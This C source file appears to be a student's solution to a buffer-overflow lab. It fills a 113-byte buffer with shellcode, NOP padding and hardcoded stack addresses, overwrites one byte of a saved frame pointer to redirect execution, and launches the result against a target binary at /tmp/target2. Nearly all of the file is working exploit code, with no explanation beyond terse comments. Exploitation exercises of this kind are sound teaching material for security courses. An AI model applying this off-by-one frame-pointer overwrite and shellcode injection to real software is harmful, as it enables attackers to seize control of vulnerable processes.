#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define BUF_SIZE 113
#define NOP      0x90   //nop 1 byte


int main(void)
{

  // write 113 buffer size
  char buffer[BUF_SIZE];

  int index = 0;
  //printf("shellcode length %d\n", sizeof(shellcode));  // 46 bytes ending with \0
 
 // buf addr 0xbffffd5c
 // Insert shellcode to front of the buffer 45 bytes
  for(; index <  strlen(shellcode); index++){
      buffer[index] = shellcode[index];
  }

 //padding 
  for(; index < 104; index++) {
      buffer[index] = 0x90; 
  }

  // overwrite foo's return addr to buffer/shellcode addr which is 0xbffffd4c
   *((int *) (buffer + index)) = 0xbffffdc8;  //must be valid addr, CAN NOT BE NOP
   index+=4;
   *((int *) (buffer + index)) = 0xbffffd4c; 
   index+=4;

  //overwrite the least significatn 1 byte in bar change to 00, which is foo's ebp
  //in bar, foo's ebp's address 0xbffffe38, 
  buffer[index++] = 0xb4;
 
  char *args[3];
  char *env[1];
  args[0] = TARGET;
  args[1] = buffer; 
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}









